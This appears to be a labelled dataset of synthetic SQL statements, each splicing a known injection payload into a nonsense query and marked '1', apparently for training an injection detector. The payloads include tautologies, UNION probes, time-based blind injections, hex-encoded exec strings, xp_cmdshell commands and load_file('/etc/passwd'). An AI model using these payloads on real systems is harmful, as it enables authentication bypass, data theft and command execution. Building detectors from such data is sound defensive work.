+INSERT INTO activity (wool, shoes) VALUES (PRINT,  or 'something' = 'some'+'thing') 1 
+DELETE FROM cannon WHERE morning = hi' or 'a'='a 1 
+DELETE FROM middle WHERE toe = ,@variable 1 
+INSERT INTO quiver (babies, cork) VALUES (tz_offset,  or x=x) 1 
+ALTER TABLE babies SET bait = 1) or benchmark(10000000,MD5(1))# WHERE song = 1 or benchmark(10000000,MD5(1))# 1 
+INSERT INTO friends (channel, page) VALUES (or 1=1,  select name from syscolumns where id = (sele ...) 1 
+DELETE FROM fall WHERE hall = ' or 1=1 1 
+INSERT INTO stocking (quartz, laborer) VALUES (1) or benchmark(10000000,MD5(1))#, PRINT @@variable) 1 
+ALTER TABLE screw SET rose = or 1=1 -- WHERE death = ; exec master..xp_cmdshell 1 
+DELETE FROM good-bye WHERE flavor = having 1 
+ALTER TABLE discovery SET appliance = ) WHERE history = | 1 
+DELETE FROM trouble WHERE good-bye = â or 1=1 -- 1 
+SELECT recess FROM grain WHERE birthday = 0 1 
+ALTER TABLE legs SET match = // WHERE hat = anything' OR 'x'='x 1 
+SELECT religion FROM bedroom WHERE oranges = ));waitfor delay '0:0:__TIME__'-- 1 
+INSERT INTO attempt (market, drum) VALUES ( or a=a--, '; exec xp_regread) 1 
+ALTER TABLE curve SET bun = x' AND userid IS NULL; -- WHERE badge = ||'6 1 
+INSERT INTO monkey (fowl, operation) VALUES () or ('a'='a, x' AND 1=(SELECT COUNT(*) FROM tabname); --) 1 
+INSERT INTO land (brass, grandfather) VALUES ( UNION SELECT, 1 waitfor delay '0:0:10'--) 1 
+INSERT INTO wire (pollution, morning) VALUES (//, ) or ('x'='x) 1 
+ALTER TABLE journey SET start = ' UNION SELECT WHERE pleasure = *| 1 
+ALTER TABLE anger SET dinner = x' AND email IS NULL; -- WHERE pocket = Ã½ or 1=1 -- 1 
+DELETE FROM mailbox WHERE window =  and 1=( if((load_file(char(110,46,101,120,11 ... 1 
+INSERT INTO whip (teeth, tongue) VALUES ( select * from information_schema.tables--, //*) 1 
+INSERT INTO bike (rock, frame) VALUES (uni/**/on sel/**/ect,  or 1 in (select @@version)--) 1 
+DELETE FROM shame WHERE lawyer =  or 'unusual' = 'unusual' 1 
+INSERT INTO number (fire, driving) VALUES ( and 1 in (select var from temp)--,  or 1=1) 1 
+DELETE FROM bee WHERE disease = ") or pg_sleep(__TIME__)-- 1 
+DELETE FROM surprise WHERE cart = ; exec master..xp_cmdshell 'ping 172.10.1.255'-- 1 
+DELETE FROM volleyball WHERE blade = 1 or 1=1 1 
+SELECT look FROM stretch WHERE quince = );waitfor delay '0:0:__TIME__'-- 1 
+SELECT value FROM insurance WHERE crayon = x' AND 1=(SELECT COUNT(*) FROM tabname); -- 1 
+SELECT horn FROM smash WHERE fork = "));waitfor delay '0:0:__TIME__'-- 1 
+DELETE FROM joke WHERE learning = exec(@s) 1 
+DELETE FROM airport WHERE icicle = " or 0=0 -- 1 
+INSERT INTO cloth (goldfish, celery) VALUES (x' OR full_name LIKE '%Bob%, sqlvuln) 1 
+SELECT mine FROM nail WHERE base = ' or 3=3 1 
+DELETE FROM representative WHERE cemetery = & 1 
+INSERT INTO jewel (friends, quince) VALUES (as, declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)) 1 
+DELETE FROM fork WHERE spot = ) or benchmark(10000000,MD5(1))# 1 
+ALTER TABLE jail SET note = t'exec master..xp_cmdshell 'nslookup www.googl ... WHERE pin = ,@variable 1 
+SELECT branch FROM trucks WHERE moon = or a=a 1 
+SELECT finger FROM jeans WHERE yoke = *(|(objectclass=*)) 1 
+DELETE FROM scarecrow WHERE kittens = ");waitfor delay '0:0:__TIME__'-- 1 
+ALTER TABLE able SET soda =  or 0=0 #" WHERE hour = asc 1 
+ALTER TABLE kittens SET star = sqlvuln WHERE cake = 1 or pg_sleep(__TIME__)-- 1 
+DELETE FROM bottle WHERE pan = *(|(objectclass=*)) 1 
+INSERT INTO father (doll, health) VALUES (char@39A+@SELECT,  or 2 between 1 and 3) 1 
+ALTER TABLE jeans SET account = x' AND 1=(SELECT COUNT(*) FROM tabname); -- WHERE snakes = insert 1 
+SELECT scent FROM act WHERE burn = insert 1 
+DELETE FROM children WHERE hot = 26 % 1 
+DELETE FROM popcorn WHERE join = or a=a 1 
+ALTER TABLE wealth SET quiet = 'sqlattempt1 WHERE flesh = 0 or 1=1 1 
+INSERT INTO taste (men, bedroom) VALUES (' or 1=1 or ''=', or a = a) 1 
+ALTER TABLE marble SET home =  or 'something' = 'some'+'thing' WHERE flock = (sqlattempt2) 1 
+DELETE FROM boats WHERE swim = (||6) 1 
+INSERT INTO temper (dog, baseball) VALUES (benchmark(10000000,MD5(1))#, //*) 1 
+ALTER TABLE action SET trip = ' or a=a-- WHERE bite = or 1=1 or ""= 1 
+SELECT fowl FROM fang WHERE bear = "a"" or 3=3--" 1 
+DELETE FROM show WHERE love = t'exec master..xp_cmdshell 'nslookup www.googl ... 1 
+DELETE FROM ship WHERE shade =  or 1=1 or ""= 1 
+INSERT INTO girls (chickens, cart) VALUES (â or 1=1 --, 'hi' or 'x'='x';) 1 
+DELETE FROM group WHERE exchange = ' or 0=0 -- 1 
+SELECT crowd FROM mitten WHERE hook = procedure 1 
+DELETE FROM apples WHERE weather = ' or ''=' 1 
+INSERT INTO banana (partner, chin) VALUES ()) or benchmark(10000000,MD5(1))#,  or 1=1 /*) 1 
+ALTER TABLE cover SET grandmother = 0 or 1=1 WHERE bushes =  or a = a 1 
+ALTER TABLE point SET space = 21 % WHERE trousers = */* 1 
+SELECT join FROM expert WHERE harbor = x' or 1=1 or 'x'='y 1 
+SELECT veil FROM stretch WHERE expert = declare @q nvarchar (4000) select @q = 1 
+DELETE FROM oil WHERE clouds = or a=a 1 
+DELETE FROM jump WHERE jelly = 1;(load_file(char(47,101,116,99,47,112,97,115, ... 1 
+SELECT magic FROM waste WHERE drawer = 1 or sleep(__TIME__)# 1 
+SELECT kite FROM trousers WHERE measure =  or 'unusual' = 'unusual' 1 
+SELECT fruit FROM wood WHERE pig = a' or 'a' = 'a 1 
+SELECT back FROM person WHERE spark =  and 1 in (select var from temp)-- 1 
+ALTER TABLE able SET desk = ; begin declare @var varchar(8000) set @var=' ... WHERE produce = ) or ('x'='x 1 
+SELECT fang FROM street WHERE rabbit = procedure 1 
+DELETE FROM space WHERE yard =  -- 1 
+SELECT unit FROM egg WHERE feather = ;waitfor delay '0:0:__TIME__'-- 1 
+INSERT INTO fork (border, fairies) VALUES (?, declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)) 1 
+SELECT shop FROM throne WHERE day = 23 OR 1=1 1 
+DELETE FROM underwear WHERE push = ) 1 
+SELECT popcorn FROM discovery WHERE house = declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q) 1 
+DELETE FROM books WHERE rest = distinct 1 
+DELETE FROM start WHERE game =  or ''=' 1 
+SELECT hose FROM celery WHERE chicken = ' or ''=' 1 
+INSERT INTO burn (month, jam) VALUES (hi or 1=1 --", distinct) 1 
+ALTER TABLE bat SET vessel =  or 3=3 WHERE party =  or 'whatever' in ('whatever') 1 
+INSERT INTO animal (test, bear) VALUES (; execute immediate 'sel' || 'ect us' || 'er',  or 1=1) 1 
+ALTER TABLE sink SET statement = ) WHERE guitar = / 1 
+SELECT monkey FROM goose WHERE tub = or 1=1 or ""= 1 
+SELECT bird FROM hand WHERE sister =  or 1=1 /* 1 
+ALTER TABLE home SET crown = & WHERE morning = ; begin declare @var varchar(8000) set @var=' ... 1 
+DELETE FROM squirrel WHERE form = ||'6 1 
+ALTER TABLE drink SET ducks = Ã½ or 1=1 -- WHERE authority = procedure 1 
+ALTER TABLE art SET bread = ) WHERE sweater =  or benchmark(10000000,MD5(1))# 1 
+SELECT club FROM flowers WHERE fairies = t'exec master..xp_cmdshell 'nslookup www.googl ... 1 
+ALTER TABLE scissors SET writer = / WHERE houses = ||(elt(-3+5,bin(15),ord(10),hex(char(45)))) 1 
+SELECT meat FROM theory WHERE history =  union select 1 
+DELETE FROM steel WHERE trees = ";waitfor delay '0:0:__TIME__'-- 1 
+ALTER TABLE locket SET plane = " or sleep(__TIME__)# WHERE glove = ? 1 
+DELETE FROM town WHERE reaction =  select * from information_schema.tables-- 1 
+DELETE FROM girl WHERE effect = 3.10E+17 1 
+ALTER TABLE beam SET body = ;waitfor delay '0:0:__TIME__'-- WHERE paper =  union all select @@version-- 1 
+DELETE FROM tooth WHERE twist = tz_offset 1 
+INSERT INTO feeling (list, silver) VALUES ( or 1/*, 1)) or pg_sleep(__TIME__)--) 1 
+SELECT attack FROM rub WHERE bike =  or 1 in (select @@version)-- 1 
+INSERT INTO birth (pickle, mine) VALUES (' or '1'='1'--, or 0=0 --) 1 
+SELECT son FROM writing WHERE cap = 1) or sleep(__TIME__)# 1 
+DELETE FROM country WHERE squirrel = â or 1=1 -- 1 
+INSERT INTO aunt (crown, ship) VALUES (tz_offset, x' AND 1=(SELECT COUNT(*) FROM tabname); --) 1 
+DELETE FROM jump WHERE banana = ; or '1'='1' 1 
+ALTER TABLE bike SET earth =  or 'unusual' = 'unusual' WHERE development = --sp_password 1 
+DELETE FROM receipt WHERE cherry =  and 1 in (select var from temp)-- 1 
+DELETE FROM hammer WHERE trail = *| 1 
+INSERT INTO polish (hands, weather) VALUES ()) or benchmark(10000000,MD5(1))#,  or a=a) 1 
+SELECT plane FROM drink WHERE sand =  or 1=1 1 
+SELECT degree FROM manager WHERE beginner = ));waitfor delay '0:0:__TIME__'-- 1 
+SELECT selection FROM cabbage WHERE wren = "));waitfor delay '0:0:__TIME__'-- 1 
+DELETE FROM process WHERE wrist = truncate 1 
+SELECT spiders FROM bomb WHERE trains = ' or 1=1 1 
+INSERT INTO grain (frog, hydrant) VALUES (declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q), like) 1 
+SELECT bean FROM direction WHERE root = x' AND userid IS NULL; -- 1 
+ALTER TABLE rate SET apple = (||6) WHERE zinc = or 0=0 -- 1 
+SELECT rule FROM jar WHERE sun =  or 1=1 or ""= 1 
+INSERT INTO table (bucket, error) VALUES (1 or sleep(__TIME__)#, ";waitfor delay '0:0:__TIME__'--) 1 
+ALTER TABLE muscle SET yoke =  or 2 > 1 WHERE sea = ||6 1 
+INSERT INTO grandfather (jewel, doll) VALUES (,@variable, |) 1 
+INSERT INTO hospital (stone, cellar) VALUES (; exec master..xp_cmdshell 'ping 172.10.1.255'--, ' or 1=1--) 1 
+DELETE FROM burst WHERE pets = 0x77616974666F722064656C61792027303A303A313027 ... 1 
+SELECT screw FROM lead WHERE women = pg_sleep(__TIME__)-- 1 
+ALTER TABLE clover SET field = 1)) or pg_sleep(__TIME__)-- WHERE channel = PRINT @@variable 1 
+INSERT INTO flesh (street, pet) VALUES (1) or benchmark(10000000,MD5(1))#, *(|(objectclass=*))) 1 
+INSERT INTO mailbox (grandfather, writer) VALUES (|, hi' or 'a'='a) 1 
+SELECT leaf FROM root WHERE bag = a' or 3=3-- 1 
+ALTER TABLE elbow SET pen = ' or (EXISTS) WHERE night = to_timestamp_tz 1 
+ALTER TABLE harmony SET middle =  or ''=' WHERE son =  or 1=1-- 1 
+SELECT downtown FROM kitty WHERE dirt = to_timestamp_tz 1 
+INSERT INTO pigs (horses, mailbox) VALUES (like, !) 1 
+INSERT INTO scissors (scale, existence) VALUES ( or a=a, /) 1 
+SELECT temper FROM coast WHERE ink =  or '7659'='7659 1 
+INSERT INTO limit (pull, friend) VALUES ( or 1=1, !) 1 
+SELECT rice FROM snails WHERE motion =  union select 1 
+DELETE FROM prison WHERE purpose = 1;SELECT * 1 
+SELECT death FROM rat WHERE rifle = ) or (a=a 1 
+ALTER TABLE sand SET list = 0 WHERE amount = ' or uname like '% 1 
+SELECT family FROM vase WHERE drug = char@39A+@SELECT 1 
+DELETE FROM beam WHERE account =  or ''=' 1 
+INSERT INTO toy (mind, crown) VALUES ( or 3=3,  --) 1 
+DELETE FROM toad WHERE mist = char@39A+@SELECT 1 
+INSERT INTO ice (fish, dolls) VALUES ( or '7659'='7659, );waitfor delay '0:0:__TIME__'--) 1 
+SELECT fang FROM stone WHERE leather = declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)  1 
+ALTER TABLE crate SET bomb = ,@variable WHERE quarter = //* 1 
+ALTER TABLE cave SET stitch =  union all select @@version-- WHERE alarm = 21 % 1 
+DELETE FROM pain WHERE silver = ");waitfor delay '0:0:__TIME__'-- 1 
+SELECT bubble FROM impulse WHERE slip = t'exec master..xp_cmdshell 'nslookup www.google.com'-- 1 
+INSERT INTO rabbit (grape, ground) VALUES (" or 1=1--, order by) 1 
+INSERT INTO tank (chess, ants) VALUES (or, 21 %) 1 
+INSERT INTO rifle (question, distance) VALUES (21 %,  or 0=0 --) 1 
+SELECT governor FROM coach WHERE snake =  and 1=( if((load_file(char(110,46,101,120,11 ... 1 
+SELECT women FROM ray WHERE cry = ")) or sleep(__TIME__)=" 1 
+DELETE FROM sisters WHERE number =  or 'whatever' in ('whatever') 1 
+ALTER TABLE story SET carriage = 1) or sleep(__TIME__)# WHERE purpose = x' AND userid IS NULL; -- 1 
+ALTER TABLE bulb SET music = ! WHERE scale = insert 1 
+ALTER TABLE rainstorm SET work = tz_offset WHERE jellyfish = 0 or 1=1 1 
+INSERT INTO skate (kitten, month) VALUES (select, "));waitfor delay '0:0:__TIME__'--) 1 
+INSERT INTO line (honey, current) VALUES (1)) or sleep(__TIME__)#,  $(sleep 50)) 1 
+INSERT INTO jellyfish (argument, arithmetic) VALUES () union select * from information_schema.tables;, as) 1 
+SELECT friend FROM squirrel WHERE north = or 1=1 1 
+INSERT INTO balls (volleyball, parent) VALUES (' or 3=3,  UNION SELECT) 1 
+ALTER TABLE chin SET can = pg_sleep(__TIME__)-- WHERE water = ') or ('x'='x 1 
+DELETE FROM straw WHERE cars = x' AND userid IS NULL; -- 1 
+INSERT INTO knowledge (hand, property) VALUES (") or sleep(__TIME__)=", ' or username like '%) 1 
+SELECT banana FROM summer WHERE slope =  or 'text' = n'text' 1 
+DELETE FROM jam WHERE drink = " or benchmark(10000000,MD5(1))# 1 
+ALTER TABLE kitty SET sleep = 26 % WHERE owner = )) or benchmark(10000000,MD5(1))# 1 
+SELECT man FROM carpenter WHERE plantation = insert 1 
+DELETE FROM ticket WHERE class = a' waitfor delay '0:0:10'-- 1 
+ALTER TABLE button SET twig = or isNULL(1/0) /* WHERE window =  or 1=1 1 
+SELECT selection FROM eyes WHERE route = # from wapiti 1 
+DELETE FROM burst WHERE father = @var select @var as var into temp end -- 1 
+DELETE FROM thrill WHERE thunder = )) or pg_sleep(__TIME__)-- 1 
+ALTER TABLE whistle SET ray =  or 'text' = n'text' WHERE things = update 1 
+SELECT nose FROM leg WHERE low = 0x770061006900740066006F0072002000640065006C00 ... 1 
+DELETE FROM trains WHERE throat =  or 2 between 1 and 3 1 
+DELETE FROM spark WHERE body =  -- &password= 1 
+ALTER TABLE silk SET aunt = declare @s varchar(200) select @s = 0x77616974 ... WHERE bedroom = procedure 1 
+INSERT INTO rest (sand, wall) VALUES (&, 3.10E+17) 1 
+SELECT door FROM plastic WHERE support = declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) 1 
+SELECT journey FROM dock WHERE quince =  -- &password= 1 
+INSERT INTO stage (form, trade) VALUES (' or ''=', declare @q nvarchar (200) 0x730065006c00650063 ...) 1 
+DELETE FROM celery WHERE duck =  or '7659'='7659 1 
+SELECT pan FROM plants WHERE hat = sqlvuln 1 
+SELECT zoo FROM blood WHERE train = order by 1 
+DELETE FROM oranges WHERE collar = " or sleep(__TIME__)# 1 
+SELECT texture FROM banana WHERE vein =  or 1/* 1 
+ALTER TABLE blow SET cellar = )) or pg_sleep(__TIME__)-- WHERE sticks = 1 or benchmark(10000000,MD5(1))# 1 
+ALTER TABLE notebook SET cloud = select WHERE condition = ; exec xp_regread 1 
+DELETE FROM pail WHERE giants =  (select top 1 1 
+ALTER TABLE statement SET transport = "hi"") or (""a""=""a" WHERE system =  or 1=1 or ""= 1 
+ALTER TABLE card SET snakes = ") or sleep(__TIME__)=" WHERE expert = insert 1 
+INSERT INTO hammer (kitty, property) VALUES (";waitfor delay '0:0:__TIME__'--, *|) 1 
+INSERT INTO wish (swim, box) VALUES (' or userid like '%, '; exec master..xp_cmdshell 'ping 172.10.1.255'--) 1 
+INSERT INTO goldfish (music, rest) VALUES (");waitfor delay '0:0:__TIME__'--,  and 1 in (select var from temp)--) 1 
+ALTER TABLE crayon SET nut = / WHERE bird = 0 1 
+SELECT sock FROM coal WHERE soap = 1;SELECT * 1 
+DELETE FROM honey WHERE actor =  or (EXISTS) 1 
+INSERT INTO support (polish, sea) VALUES ( or (EXISTS), 1) or benchmark(10000000,MD5(1))#) 1 
+DELETE FROM yam WHERE celery = procedure 1 
+INSERT INTO coach (agreement, control) VALUES (â or 3=3 --, a' or 1=1--) 1 
+ALTER TABLE reason SET tank = or WHERE wrench = insert 1 
+DELETE FROM finger WHERE look = "));waitfor delay '0:0:__TIME__'-- 1 
+SELECT stream FROM animal WHERE experience = ' UNION SELECT 1 
+INSERT INTO spade (shape, memory) VALUES (")) or benchmark(10000000,MD5(1))#, ' or 1=1 or ''=') 1 
+INSERT INTO caption (event, boot) VALUES (a' waitfor delay '0:0:10'--, ' or '1'='1'--) 1 
+SELECT burst FROM crown WHERE humor = anything' OR 'x'='x 1 
+DELETE FROM attention WHERE kittens = replace 1 
+DELETE FROM rose WHERE doctor =  or 2 > 1 1 
+INSERT INTO rod (cover, robin) VALUES (limit, ' or user like '%) 1 
+SELECT basketball FROM airplane WHERE chess = a' or 1=1-- 1 
+SELECT bath FROM guitar WHERE dinosaurs = ||6 1 
+DELETE FROM banana WHERE veil =  -- 1 
+ALTER TABLE servant SET rhythm = update WHERE cows =  (select top 1 1 
+ALTER TABLE daughter SET pig = 28 % WHERE sugar = ||6 1 
+ALTER TABLE band SET hall = declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) WHERE bird = ) 1 
+DELETE FROM pencil WHERE rod = ' or '1'='1'-- 1 
+SELECT wood FROM sack WHERE wing =  or '1'='1'-- 1 
+ALTER TABLE support SET title = Ã½ or 1=1 -- WHERE place = a' or 1=1-- 1 
+DELETE FROM brass WHERE grain = ' or 1=1-- 1 
+DELETE FROM fork WHERE bit =  -- &password= 1 
+DELETE FROM cap WHERE alley = declare @s varchar (200) select @s = 0x73656c6 ... 1 
+INSERT INTO jeans (fang, rule) VALUES (; exec master..xp_cmdshell, ') or ('a'='a) 1 
+SELECT seat FROM dime WHERE bucket = 1)) or pg_sleep(__TIME__)-- 1 
+INSERT INTO flight (believe, wood) VALUES (declare @s varchar (8000) select @s = 0x73656c ..., 1) or benchmark(10000000,MD5(1))#) 1 
+INSERT INTO oranges (locket, polish) VALUES (insert, ' or userid like '%) 1 
+ALTER TABLE bikes SET scarecrow = anything' OR 'x'='x WHERE heart = *(|(mail=*)) 1 
+DELETE FROM actor WHERE brain = 1 or sleep(__TIME__)# 1 
+INSERT INTO lace (system, screw) VALUES (||UTL_HTTP.REQUEST, 'sqlattempt1) 1 
+SELECT nest FROM wealth WHERE boot = 1 waitfor delay '0:0:10'-- 1 
+INSERT INTO holiday (scarf, gate) VALUES ((,  or 2 between 1 and 3) 1 
+SELECT print FROM blow WHERE smile = " or 1=1-- 1 
+DELETE FROM jeans WHERE paper = # from wapiti 1 
+ALTER TABLE sweater SET drop = ' or 0=0 -- WHERE monkey = declare @s varchar(200) select @s = 0x77616974 ... 1 
+ALTER TABLE stew SET wood = x' AND members.email IS NULL; -- WHERE father = ') or ('a'='a 1 
+SELECT appliance FROM move WHERE father = *(|(objectclass=*)) 1 
+SELECT snake FROM owl WHERE stamp = declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)  1 
+INSERT INTO mountain (celery, payment) VALUES ()) or pg_sleep(__TIME__)--, or a = a) 1 
+ALTER TABLE quill SET home = ||(elt(-3+5,bin(15),ord(10),hex(char(45)))) WHERE kite = '; exec xp_regread 1 
+INSERT INTO liquid (knot, reading) VALUES (admin' or ', 3.10E+17) 1 
+DELETE FROM dime WHERE kettle = ' UNION ALL SELECT 1 
+SELECT team FROM news WHERE scene = ' or 1=1 1 
+DELETE FROM fact WHERE look = )) or sleep(__TIME__)=' 1 
+DELETE FROM doctor WHERE notebook = password:*/=1-- 1 
+DELETE FROM library WHERE business = (sqlvuln) 1 
+ALTER TABLE whistle SET zephyr = hi' or 'x'='x'; WHERE tendency = " or pg_sleep(__TIME__)-- 1 
+ALTER TABLE substance SET shoes = declare @q nvarchar (200) select @q = 0x770061 ... WHERE head = 23 OR 1=1 1 
+SELECT lettuce FROM way WHERE statement = to_timestamp_tz 1 
+SELECT baby FROM toe WHERE drum = 1)) or pg_sleep(__TIME__)-- 1 
+DELETE FROM able WHERE hammer = x' AND userid IS NULL; -- 1 
+SELECT quarter FROM pump WHERE beast = ")) or benchmark(10000000,MD5(1))# 1 
+SELECT town FROM bubble WHERE play = a' waitfor delay '0:0:10'-- 1 
+SELECT squirrel FROM sticks WHERE face = handler 1 
+SELECT mother FROM pencil WHERE neck = or 1=1 or ""= 1 
+SELECT brother FROM sponge WHERE carpenter = 1 or benchmark(10000000,MD5(1))# 1 
+ALTER TABLE angle SET coast = x' AND members.email IS NULL; -- WHERE store =  union all select @@version-- 1 
+INSERT INTO cub (sneeze, hose) VALUES ( union select 1,load_file('/etc/passwd'),1,1,1;, \x27UNION SELECT) 1 
+DELETE FROM spade WHERE desk = 'sqlattempt1 1 
+DELETE FROM planes WHERE bedroom = ) or sleep(__TIME__)=' 1 
+ALTER TABLE berry SET bottle = x' AND userid IS NULL; -- WHERE memory = ' or 1 --' 1 
+ALTER TABLE jelly SET coat =  or 1=1 or ''=' WHERE wind = 1;SELECT * 1 
+SELECT anger FROM rest WHERE laborer = tz_offset 1 
+SELECT creature FROM sweater WHERE branch = 0 1 
+INSERT INTO growth (books, guitar) VALUES ());waitfor delay '0:0:__TIME__'--, )) or sleep(__TIME__)=') 1 
+SELECT foot FROM trick WHERE eggs = );waitfor delay '0:0:__TIME__'-- 1 
+INSERT INTO chess (creature, beds) VALUES ('hi' or 'x'='x';, ; begin declare @var varchar(8000) set @var=' ...) 1 
+SELECT dime FROM voyage WHERE cellar = PRINT 1 
+INSERT INTO pot (start, animal) VALUES (hi' or 1=1 --, ));waitfor delay '0:0:__TIME__'--) 1 
+INSERT INTO mind (hate, regret) VALUES () or sleep(__TIME__)=', " or 0=0 --) 1 
+ALTER TABLE map SET crack = or WHERE pollution = handler 1 
+INSERT INTO door (parent, railway) VALUES (or 1=1 --, 0x77616974666F722064656C61792027303A303A313027 ...) 1 
+SELECT ghost FROM thumb WHERE secretary = | 1 
+ALTER TABLE bat SET grip = 'hi' or 'x'='x'; WHERE snail = 29 % 1 
+ALTER TABLE sense SET turn = ")) or sleep(__TIME__)=" WHERE belief = asc 1 
+INSERT INTO believe (earth, spark) VALUES (), ||6) 1 
+INSERT INTO aunt (weather, boats) VALUES (,@variable, "a"" or 1=1--") 1 
+SELECT book FROM hook WHERE mine = or 1=1 or ""= 1 
+SELECT pie FROM breath WHERE debt =  or a=a-- 1 
+SELECT horn FROM lumber WHERE home =  or 0=0 #" 1 
+ALTER TABLE owl SET art =  or 3=3 -- WHERE value = ( 1 
+SELECT finger FROM clock WHERE circle = '||UTL_HTTP.REQUEST 1 
